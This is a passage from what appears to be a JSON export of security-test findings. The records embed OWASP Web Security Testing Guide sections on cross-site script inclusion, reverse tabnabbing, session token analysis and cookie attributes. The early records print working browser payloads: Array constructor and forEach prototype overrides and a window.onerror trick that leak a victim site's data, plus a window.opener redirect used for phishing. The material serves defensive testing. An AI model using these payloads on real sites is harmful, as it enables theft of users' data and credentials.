result.\n\n\u0060\u0060\u0060\n1,\u0022\\\u0022\u0022,$$$=function(){/*\u0022,\u0022aaa@a.example\u0022,\u002203-0000-0001\u0022\n2,\u0022foo\u0022,\u0022bbb@b.example\u0022,\u002203-0000-0002\u0022\n...\n98,\u0022bar\u0022,\u0022yyy@example.net\u0022,\u002203-0000-0088\u0022\n99,\u0022*/}//\u0022,\u0022zzz@example.com\u0022,\u002203-0000-0099\u0022\n\u0060\u0060\u0060\n\n[Jeremiah Grossman wrote about a similar vulnerability in Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) in 2006 that allowed the extraction of user contacts in JSON. In this case, the data was received from Gmail and parsed by the browser JavaScript engine using an unreferenced Array constructor to leak the data. An attacker could access this Array with the sensitive data by defining and overwriting the internal Array constructor like this:\n\n\u0060\u0060\u0060\n\u003C!DOCTYPE html\u003E\n\u003Chtml\u003E\n  \u003Chead\u003E\n    \u003Ctitle\u003ELeaking gmail contacts via JSON \u003C/title\u003E\n  \u003C/head\u003E\n  \u003Cbody\u003E\n    \u003Cscript\u003E\n      function Array() {\n        // steal data\n      }\n    \u003C/script\u003E\n    \u003Cscript src=\u0022http://mail.google.com/mail/?_url_scrubbed_\u0022\u003E\u003C/script\u003E\n  \u003C/body\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\n### 4\\. Sensitive Data Leakage via JavaScript Runtime Errors\n\nBrowsers normally present standardized [JavaScript error messages](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors). However, in the case of IE9/10, runtime error messages provided additional details that could be used to leak data. For example, a website \u0060victim.com\u0060 serves the following content at the URI \u0060http://victim.com/service/csvendpoint\u0060 for authenticated users:\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\nContent-Type: text/csv\nContent-Disposition: attachment; filename=\u0022a.csv\u0022\nContent-Length: 13\n\n1,abc,def,ghi\n\u0060\u0060\u0060\n\nThis vulnerability could be exploited with the following:\n\n\u0060\u0060\u0060\n\u003C!--error handler --\u003E\n\u003Cscript\u003Ewindow.onerror = function(err) {alert(err)}\u003C/script\u003E\n\u003C!--load target CSV --\u003E\n\u003Cscript src=\u0022http://victim.com/service/csvendpoint\u0022\u003E\u003C/script\u003E\n\u0060\u0060\u0060\n\nWhen the browser tries to render the CSV content as JavaScript, it fails and leaks the sensitive data:\n![JavaScript runtime error message](Image Not Found)\n*Figure 4.11.13-1: JavaScript runtime error message*\n\n### 5\\. Sensitive Data Leakage via Prototype Chaining Using \u0060this\u0060\n\nIn JavaScript, the \u0060this\u0060 keyword is dynamically scoped. This means if a function is called upon an object, \u0060this\u0060 will point to this object even though the called function might not belong to the object itself. This behavior can be used to leak data. In the following example from [Sebastian Leike\u2019s demonstration page](http://sebastian-lekies.de/leak/), the sensitive data is stored in an Array. An attacker can override \u0060Array.prototype.forEach\u0060 with an attacker-controlled function. If some code calls the \u0060forEach\u0060 function on an array instance that contains sensitive values, the attacker-controlled function will be invoked with \u0060this\u0060 pointing to the object that contains the sensitive data.\nHere is an excerpt of a JavaScript file containing sensitive data, \u0060javascript.js\u0060:\n\n\u0060\u0060\u0060\n...\n(function() {\n  var secret = [\u0022578a8c7c0d8f34f5\u0022, \u0022345a8b7c9d8e34f5\u0022];\n\n  secret.forEach(function(element) {\n    // do something here\n  });  \n})();\n...\n\u0060\u0060\u0060\n\nThe sensitive data can be leaked with the following JavaScript code:\n\n\u0060\u0060\u0060\n...\n \u003Cdiv id=\u0022result\u0022\u003E\n\n    \u003C/div\u003E\n    \u003Cscript\u003E\n      Array.prototype.forEach = function(callback) {\n        var resultString = \u0022Your secret values are: \u003Cb\u003E\u0022;\n        for (var i = 0, length = this.length; i \u003C length; i\u002B\u002B) {\n          if (i \u003E 0) {\n            resultString \u002B= \u0022, \u0022;\n          }\n          resultString \u002B= this[i];\n        }\n        resultString \u002B= \u0022\u003C/b\u003E\u0022;\n        var div = document.getElementById(\u0022result\u0022);\n        div.innerHTML = resultString;\n      };\n    \u003C/script\u003E\n    \u003Cscript src=\u0022http://victim.com/..../javascript.js\u0022\u003E\u003C/script\u003E\n...\n\u0060\u0060\u0060","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-14 Testing for Reverse Tabnabbing","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Reverse_Tabnabbing","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Reverse_Tabnabbing","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"[Reverse Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing) is an attack which can be used to redirect users to phishing pages. This usually becomes possible due to the \u0060target\u0060 attribute of the \u0060\u003Ca\u003E\u0060 tag being set to \u0060_blank\u0060 which causes the link to be opened in a new tab. When the attribute \u0060rel=\u0027noopener noreferrer\u0027\u0060 is not used in the same \u0060\u003Ca\u003E\u0060 tag, the newly opened page can influence the original page and redirect it to a domain controlled by the attacker.\nSince the user was on the original domain when the new tab opened, they are less likely to notice that the page has changed, especially if the phishing page is identical to the original domain. Any credentials entered on the attacker-controlled domain will thus end up in the attacker\u2019s possession.\nLinks opened via the \u0060window.open\u0060 JavaScript function are also vulnerable to this attack.\n*NOTE: This is a legacy issue that does not affect [modern browsers](https://caniuse.com/mdn-html_elements_a_implicit_noopener). Older versions of popular browsers (For example, versions prior to Google Chrome 88) as well as Internet Explorer are vulnerable to this attack.*\n\n### Example\n\nImagine a web application where users are allowed to insert a URL in their profile. If the application is vulnerable to reverse tabnabbing, a malicious user will be able to provide a link to a page that has the following code:\n\n\u0060\u0060\u0060\n\u003Chtml\u003E\n \u003Cbody\u003E\n  \u003Cscript\u003E\n    window.opener.location = \u0022https://example.org\u0022;\n  \u003C/script\u003E\n\u003Cb\u003EError loading...\u003C/b\u003E\n \u003C/body\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\nClicking on the link will open up a new tab while the original tab will redirect to \u201Cexample.org\u201D. Suppose \u201Cexample.org\u201D looks similar to the vulnerable web application, the user is less likely to notice the change and is more likely to enter sensitive information on the page.\n\n\u003Cbr\u003E\n","TestingInstructions":"## How to Test\n\n* Check the HTML source of the application to see if links with \u0060target=\u0022_blank\u0022\u0060 are using the \u0060noopener\u0060 and \u0060noreferrer\u0060 keywords in the \u0060rel\u0060 attribute. If not, it is likely that the application is vulnerable to reverse tabnabbing. Such a link becomes exploitable if it either points to a third-party site that has been compromised by the attacker, or if it is user-controlled.\n* Check for areas where an attacker can insert links, i.e. control the \u0060href\u0060 argument of an \u0060\u003Ca\u003E\u0060 tag. Try to insert a link to a page which has the source code given in the above example, and see if the original domain redirects. This test can be done in IE if other browsers don\u2019t work.","Details":null,"Implication":null,"Recommendation":" It is recommended to make sure that the \u0060rel\u0060 HTML attribute is set with the \u0060noreferrer\u0060 and \u0060noopener\u0060 keywords for all links.","References":"* [Tabnabbing - HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing)\n* [The target=\u201D_blank\u201D vulnerability by example](https://dev.to/ben/the-targetblank-vulnerability-by-example)\n* [About rel=noopener](https://mathiasbynens.github.io/rel-noopener/)\n* [Target=\u201D_blank\u201D \u2014 the most underestimated vulnerability ever](https://medium.com/@jitbit/target-blank-the-most-underestimated-vulnerability-ever-96e328301f4c)\n* [Reverse tabnabbing vulnerability affects IBM Business Automation Workflow and IBM Business Process Manager](https://www.ibm.com/support/pages/security-bulletin-reverse-tabnabbing-vulnerability-affects-ibm-business-automation-workflow-and-ibm-business-process-manager-bpm-cve-2020-4490-0)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-01 Testing for Session Management Schema","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nOne of the core components of any web-based application is the mechanism by which it controls and maintains the state for a user interacting with it. To avoid continuous authentication for each page of a site or service, web applications implement various mechanisms to store and validate credentials for a pre-determined timespan. These mechanisms are known as Session Management.\nIn this test, the tester wants to check that cookies and other session tokens are created in a secure and unpredictable way. An attacker who is able to predict and forge a weak cookie can easily hijack the sessions of legitimate users.\nCookies are used to implement session management and are described in detail in RFC 2965. In a nutshell, when a user accesses an application which needs to keep track of the actions and identity of that user across multiple requests, a cookie (or cookies) is generated by the server and sent to the client. The client will then send the cookie back to the server in all following connections until the cookie expires or is destroyed. The data stored in the cookie can provide to the server a large spectrum of information about who the user is, what actions he has performed so far, what his preferences are, etc. therefore providing a state to a stateless protocol like HTTP.\nA typical example is provided by an online shopping cart. Throughout the session of a user, the application must keep track of his identity, his profile, the products that he has chosen to buy, the quantity, the individual prices, the discounts, etc. Cookies are an efficient way to store and pass this information back and forth (other methods are URL parameters and hidden fields).\nDue to the importance of the data that they store, cookies are therefore vital in the overall security of the application. Being able to tamper with cookies may result in hijacking the sessions of legitimate users, gaining higher privileges in an active session, and in general influencing the operations of the application in an unauthorized way.\nIn this test the tester has to check whether the cookies issued to clients can resist a wide range of attacks aimed to interfere with the sessions of legitimate users and with the application itself. The overall goal is to be able to forge a cookie that will be considered valid by the application and that will provide some kind of unauthorized access (session hijacking, privilege escalation, \u2026).\nUsually the main steps of the attack pattern are the following:\n\n* **cookie collection**: collection of a sufficient number of cookie samples;\n* **cookie reverse engineering**: analysis of the cookie generation algorithm;\n* **cookie manipulation**: forging of a valid cookie in order to perform the attack. This last step might require a large number of attempts, depending on how the cookie is created (cookie brute-force attack).\n\nAnother pattern of attack consists of overflowing a cookie. Strictly speaking, this attack has a different nature, since here testers are not trying to recreate a perfectly valid cookie. Instead, the goal is to overflow a memory area, thereby interfering with the correct behavior of the application and possibly injecting (and remotely executing) malicious code.\n\n\u003Cbr\u003E\n","TestingInstructions":"## Test Objectives\n\n* Gather session tokens, for the same user and for different users where possible.\n* Analyze and ensure that enough randomness exists to stop session forging attacks.\n* Modify cookies that are not signed and contain information that can be manipulated.\n\n## How to Test\n\n### Black-Box Testing and Examples\n\nAll interaction between the client and application should be tested at least against the following criteria:\n\n* Are all \u0060Set-Cookie\u0060 directives tagged as \u0060Secure\u0060?\n* Do any Cookie operations take place over unencrypted transport?\n* Can the Cookie be forced over unencrypted transport?\n* If so, how does the application maintain security?\n* Are any Cookies persistent?\n* What \u0060Expires\u0060 times are used on persistent cookies, and are they reasonable?\n* Are cookies that are expected to be transient configured as such?\n* What HTTP/1.1 \u0060Cache-Control\u0060 settings are used to protect Cookies?\n* What HTTP/1.0 \u0060Cache-Control\u0060 settings are used to protect Cookies?\n\n#### Cookie Collection\n\nThe first step required to manipulate the cookie is to understand how the application creates and manages cookies. For this task, testers have to try to answer the following questions:\n\n* How many cookies are used by the application?\n    Surf the application. Note when cookies are created. Make a list of received cookies, the page that sets them (with the set-cookie directive), the domain for which they are valid, their value, and their characteristics.\n* Which parts of the application generate or modify the cookie?\n    Surfing the application, find which cookies remain constant and which get modified. What events modify the cookie?\n* Which parts of the application require this cookie in order to be accessed and utilized?\n    Find out which parts of the application need a cookie. Access a page, then try again without the cookie, or with a modified value of it. Try to map which cookies are used where.\n\nA spreadsheet mapping each cookie to the corresponding application parts and the related information can be a valuable output of this phase.\n\n#### Session Analysis\n\nThe session tokens (Cookie, SessionID or Hidden Field) themselves should be examined to ensure their quality from a security perspective. They should be tested against criteria such as their randomness, uniqueness, resistance to statistical and cryptographic analysis and information leakage.\n\n* Token Structure \u0026 Information Leakage\n\nThe first stage is to examine the structure and content of a Session ID provided by the application. A common mistake is to include specific data in the Token instead of issuing a generic value and referencing real data server-side.\nIf the Session ID is clear-text, the structure and pertinent data may be immediately obvious such as \u0060192.168.100.1:owaspuser:password:15:58\u0060.\nIf part or the entire token appears to be encoded or hashed, it should be compared to various techniques to check for obvious obfuscation. For example the string \u0060192.168.100.1:owaspuser:password:15:58\u0060 is represented in hex, base64, and as an MD5 hash:\n\n* Hex: \u00603139322E3136382E3130302E313A6F77617370757365723A70617373776F72643A31353A3538\u0060\n* Base64: \u0060MTkyLjE2OC4xMDAuMTpvd2FzcHVzZXI6cGFzc3dvcmQ6MTU6NTg=\u0060\n* MD5: \u006001c2fc4f0a817afd8366689bd29dd40a\u0060\n\nHaving identified the type of obfuscation, it may be possible to decode back to the original data. In most cases, however, this is unlikely. Even so, it may be useful to enumerate the encoding in place from the format of the message. Furthermore, if both the format and obfuscation technique can be deduced, automated brute-force attacks could be devised.\nHybrid tokens may include information such as IP address or User ID together with an encoded portion, such as \u0060owaspuser:192.168.100.1:a7656fafe94dae72b1e1487670148412\u0060.\nHaving analyzed a single session token, the representative sample should be examined. A simple analysis of the tokens should immediately reveal any obvious patterns. For example, a 32 bit token may include 16 bits of static data and 16 bits of variable data. This may indicate that the first 16 bits represent a fixed attribute of the user \u2013 e.g. the username or IP address. If the second 16 bit chunk is incrementing at a regular rate, it may indicate a sequential or even time-based element to the token generation. See examples.\nIf static elements to the Tokens are identified, further samples should be gathered, varying one potential input element at a time. For example, log in attempts through a different user account or from a different IP address may yield a variance in the previously static portion of the session token.\nThe following areas should be addressed during the single and multiple Session ID structure testing:\n\n* What parts of the Session ID are static?\n* What clear-text confidential information is stored in the Session ID? E.g. usernames/UID, IP addresses\n* What easily decoded confidential information is stored?\n* What information can be deduced from the structure of the Session ID?\n* What portions of the Session ID are static for the same log in conditions?\n* What obvious patterns are present in the Session ID as a whole, or individual portions?\n\n#### Session ID Predictability and Randomness\n\nAnalysis of the variable areas (if any) of the Session ID should be undertaken to establish the existence of any recognizable or predictable patterns. These analyses may be performed manually and with bespoke or OTS statistical or cryptanalytic tools to deduce any patterns in the Session ID content. Manual checks should include comparisons of Session IDs issued for the same login conditions \u2013 e.g., the same username, password, and IP address.\nTime is an important factor which must also be controlled. High numbers of simultaneous connections should be made in order to gather samples in the same time window and keep that variable constant. Even a quantization of 50ms or less may be too coarse and a sample taken in this way may reveal time-based components that would otherwise be missed.\nVariable elements should be analyzed over time to determine whether they are incremental in nature. Where they are incremental, patterns relating to absolute or elapsed time should be investigated. Many systems use time as a seed for their pseudo-random elements. Where the patterns are seemingly random, one-way hashes of time or other environmental variations should be considered as a possibility. Typically, the result of a cryptographic hash is a decimal or hexadecimal number so should be identifiable.\nIn analyzing Session ID sequences, patterns or cycles, static elements and client dependencies should all be considered as possible contributing elements to the structure and function of the application.\n\n* Are the Session IDs provably random in nature? Can the resulting values be reproduced?\n* Do the same input conditions produce the same ID on a subsequent run?\n* Are the Session IDs provably resistant to statistical or cryptanalysis?\n* What elements of the Session IDs are time-linked?\n* What portions of the Session IDs are predictable?\n* Can the next ID be deduced, given full knowledge of the generation algorithm and previous IDs?\n\n#### Cookie Reverse Engineering\n\nNow that the tester has enumerated the cookies and has a general idea of their use, it is time to have a deeper look at cookies that seem interesting. Which cookies is the tester interested in? A cookie, in order to provide a secure method of session management, must combine several characteristics, each of which is aimed at protecting the cookie from a different class of attacks.\nThese characteristics are summarized below:\n\n1. Unpredictability: a cookie must contain some amount of hard-to-guess data. The harder it is to forge a valid cookie, the harder is to break into legitimate user\u2019s session. If an attacker can guess the cookie used in an active session of a legitimate user, they will be able to fully impersonate that user (session hijacking). In order to make a cookie unpredictable, random values or cryptography can be used.\n2. Tamper resistance: a cookie must resist malicious attempts of modification. If the tester receives a cookie like \u0060IsAdmin=No\u0060, it is trivial to modify it to get administrative rights, unless the application performs a double check (for instance, appending to the cookie an encrypted hash of its value)\n3. Expiration: a critical cookie must be valid only for an appropriate period of time and must be deleted from the disk or memory afterwards to avoid the risk of being replayed. This does not apply to cookies that store non-critical data that needs to be remembered across sessions (e.g., site look-and-feel).\n4. \u0060Secure\u0060 flag: a cookie whose value is critical for the integrity of the session should have this flag enabled in order to allow its transmission only in an encrypted channel to deter eavesdropping.\n\nThe approach here is to collect a sufficient number of instances of a cookie and start looking for patterns in their value. The exact meaning of \u201Csufficient\u201D can vary from a handful of samples, if the cookie generation method is very easy to break, to several thousands, if the tester needs to proceed with some mathematical analysis (e.g., chi-squares, attractors. See later for more information).\nIt is important to pay particular attention to the workflow of the application, as the state of a session can have a heavy impact on collected cookies. A cookie collected before being authenticated can be very different from a cookie obtained after the authentication.\nAnother aspect to keep into consideration is time. Always record the exact time when a cookie has been obtained, when there is the possibility that time plays a role in the value of the cookie (the server could use a timestamp as part of the cookie value). The time recorded could be the local time or the server\u2019s timestamp included in the HTTP response (or both).\nWhen analyzing the collected values, the tester should try to figure out all variables that could have influenced the cookie value and try to vary them one at the time. Passing to the server modified versions of the same cookie can be very helpful in understanding how the application reads and processes the cookie.\nExamples of checks to be performed at this stage include:\n\n* What character set is used in the cookie? Has the cookie a numeric value? alphanumeric? hexadecimal? What happens if the tester inserts in a cookie characters that do not belong to the expected charset?\n* Is the cookie composed of different sub-parts carrying different pieces of information? How are the different parts separated? With which delimiters? Some parts of the cookie could have a higher variance, others might be constant, others could assume only a limited set of values. Breaking down the cookie to its base components is the first and fundamental step.\n\nAn example of an easy-to-spot structured cookie is the following:\n\n\u0060\u0060\u0060\nID=5a0acfc7ffeb919:CR=1:TM=1120514521:LM=1120514521:S=j3am5KzC4v01ba3q\n\u0060\u0060\u0060\n\nThis example shows 5 different fields, carrying different types of data:\n\n* ID \u2013 hexadecimal\n* CR \u2013 small integer\n* TM and LM \u2013 large integer. (And curiously they hold the same value. Worth to see what happens modifying one of them)\n* S \u2013 alphanumeric\n\nEven when no delimiters are used, having enough samples can help understand the structure.\n\n#### Brute Force Attacks\n\nBrute force attacks inevitably lead on from questions relating to predictability and randomness. The variance within the Session IDs must be considered together with application session duration and timeouts. If the variation within the Session IDs is relatively small, and Session ID validity is long, the likelihood of a successful brute-force attack is much higher.\nA long Session ID (or rather one with a great deal of variance) and a shorter validity period would make it far harder to succeed in a brute force attack.\n\n* How long would a brute-force attack on all possible Session IDs take?\n* Is the Session ID space large enough to prevent brute forcing? For example, is the length of the key sufficient when compared to the valid life-span?\n* Do delays between connection attempts with different Session IDs mitigate the risk of this attack?\n\n### Gray-Box Testing and Example\n\nIf the tester has access to the session management schema implementation, they can check for the following:\n\n* Random Session Token\n    The Session ID or Cookie issued to the client should not be easily predictable (don\u2019t use linear algorithms based on predictable variables such as the client IP address). The use of cryptographic algorithms with key length of 256 bits is encouraged (like AES).\n* Token length\n    Session ID will be at least 50 characters length.\n* Session Time-out\n    Session token should have a defined time-out (it depends on the criticality of the application managed data)\n* Cookie configuration:\n    * non-persistent: only RAM memory\n    * secure (set only on HTTPS channel): \u0060Set-Cookie: cookie=data; path=/; domain=.aaa.it; secure\u0060\n    * [HTTPOnly](https://owasp.org/www-community/HttpOnly) (not readable by a script): \u0060Set-Cookie: cookie=data; path=/; domain=.aaa.it; HttpOnly\u0060\n\nMore information here: [Testing for cookies attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)\n\n## Tools\n\n* [Zed Attack Proxy Project (ZAP)](https://www.zaproxy.org/) \\- features a session token analysis mechanism\\.\n* [Burp Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer)\n* [YEHG\u2019s JHijack](https://github.com/yehgdotnet/JHijack)","Details":null,"Implication":null,"Recommendation":null,"References":"* [RFC 2965 \u201CHTTP State Management Mechanism\u201D](https://tools.ietf.org/html/rfc2965)\n* [RFC 1750 \u201CRandomness Recommendations for Security\u201D](https://www.ietf.org/rfc/rfc1750.txt)\n* [Michal Zalewski: \u201CStrange Attractors and TCP/IP Sequence Number Analysis\u201D (2001)](http://lcamtuf.coredump.cx/oldtcp/tcpseq.html)\n* [Michal Zalewski: \u201CStrange Attractors and TCP/IP Sequence Number Analysis - One Year Later\u201D (2002)](http://lcamtuf.coredump.cx/newtcp/)\n* [Correlation Coefficient](http://mathworld.wolfram.com/CorrelationCoefficient.html)\n* [ENT](https://fourmilab.ch/random/)\n* [DMA 2005-0614a - Global Hauri ViRobot Server cookie overflow](https://seclists.org/lists/fulldisclosure/2005/Jun/0188.html)\n* [Gunter Ollmann: \u201CWeb Based Session Management\u201D](http://www.technicalinfo.net/)\n* [OWASP Code Review Guide](https://wiki.owasp.org/index.php/Category:OWASP_Code_Review_Project)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-02 Testing for Cookies Attributes","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nWeb Cookies (herein referred to as cookies) are often a key attack vector for malicious users (typically targeting other users) and the application should always take due diligence to protect cookies.\nHTTP is a stateless protocol, meaning that it doesn\u2019t hold any reference to requests being sent by the same user. In order to fix this issue, sessions were created and appended to HTTP requests. Browsers, as discussed in [testing browser storage](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage), contain a multitude of storage mechanisms. In that section of the guide, each is discussed thoroughly.\nThe most used session storage mechanism in browsers is cookie storage. Cookies can be set by the server, by including a [\u0060Set-Cookie\u0060](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) header in the HTTP response or via JavaScript. Cookies can be used for a multitude of reasons, such as:\n\n* session management\n* personalization\n* tracking\n\nIn order to secure cookie data, the industry has developed means to help lock down these cookies and limit their attack surface. Over time cookies have become a preferred storage mechanism for web applications, as they allow great flexibility in use and protection.\nThe means to protect the cookies are:\n\n* [Cookie Attributes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Creating_cookies)\n* [Cookie Prefixes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Cookie_prefixes)","TestingInstructions":"## Test Objectives\n\n* Ensure that the proper security configuration is set for cookies.\n\n## How to Test\n\nBelow, a description of every attribute and prefix will be discussed. The tester should validate that they are being used properly by the application. Cookies can be reviewed by using an [intercepting proxy](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes#intercepting-proxy), or by reviewing the browser\u2019s cookie jar.\n\n### Cookie Attributes\n\n#### Secure Attribute\n\nThe [\u0060Secure\u0060](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Secure) attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as \u0060HTTPS\u0060. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both \u0060HTTP\u0060 and \u0060HTTPS\u0060, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.\n\n#### HttpOnly Attribute\n\nThe [\u0060HttpOnly\u0060](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#HttpOnly) attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.\n\n\u003E This doesn\u2019t limit the whole attack surface of XSS attacks, as an attacker could still send request in place of the user, but limits immensely the reach of XSS attack vectors.\n\n#### Domain Attribute\n\nThe [\u0060Domain\u0060](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies) attribute is used to compare the cookie\u2019s domain against the domain of the server for which the HTTP request is being made. If the domain matches or if it is a subdomain, then the [\u0060path\u0060](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes#path-attribute) attribute will be checked next.\nNote that only hosts that belong to the specified domain can set a cookie for that domain. Additionally, the \u0060domain\u0060 attribute cannot be a top level domain (such as \u0060.gov\u0060 or \u0060.com\u0060) to prevent servers from setting arbitrary cookies for another domain (such as setting a cookie for \u0060owasp.org\u0060). If the domain attribute is not set, then the hostname of the server that generated the cookie is used as the default value of the \u0060domain\u0060.\nFor example, if a cookie is set by an application at \u0060app.mydomain.com\u0060 with no domain attribute set, then the cookie would be resubmitted for all subsequent requests for \u0060app.mydomain.com\u0060, but not its subdomains (such as \u0060hacker.app.mydomain.com\u0060), or to \u0060otherapp.mydomain.com\u0060. (However, older versions of Edge/IE behave differently, and *do* send these cookies to subdomains.) If a developer wanted to loosen this restriction, then they could set the \u0060domain\u0060 attribute to \u0060mydomain.com\u0060. In this case the cookie would be sent to all requests for \u0060app.mydomain.com\u0060 and \u0060mydomain.com\u0060 subdomains, such as \u0060hacker.app.mydomain.com\u0060, and even \u0060bank.mydomain.com\u0060. If there was a vulnerable server on a subdomain (for example, \u0060otherapp.mydomain.com\u0060) and the \u0060domain\u0060 attribute has been set too loosely (for example, \u0060mydomain.com\u0060), then the vulnerable server could be used to harvest cookies (such as session tokens) across the full scope of \u0060mydomain.com\u0060.\n\n#### Path Attribute\n\nThe [\u0060Path\u0060](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies) attribute plays a major role in setting the scope of the cookies in conjunction with the [\u0060domain\u0060](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes#domain-attribute). In addition to the domain, the URL path that the cookie is valid for can be specified. If the domain and path match, then the cookie will be sent in the request. Just as with the domain attribute, if the path attribute is set too loosely, then it could leave the application vulnerable to attacks by other applications on the same server. For example, if the path attribute was set to the web server root \u0060/\u0060, then the application cookies will be sent to every application within the same domain (if multiple application reside under the same server). A couple of examples for multiple applications under the same server:\n\n* \u0060path=/bank\u0060\n* \u0060path=/private\u0060\n* \u0060path=/docs\u0060\n* \u0060path=/docs/admin\u0060\n\n#### Expires Attribute\n\nThe [\u0060Expires\u0060](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Permanent_cookies) attribute is used to:\n\n* set persistent cookies\n* limit lifespan if a session lives for too long\n* remove a cookie forcefully by setting it to a past date\n\nUnlike [session cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Session_cookies), persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.\n\n#### SameSite Attribute\n\nThe 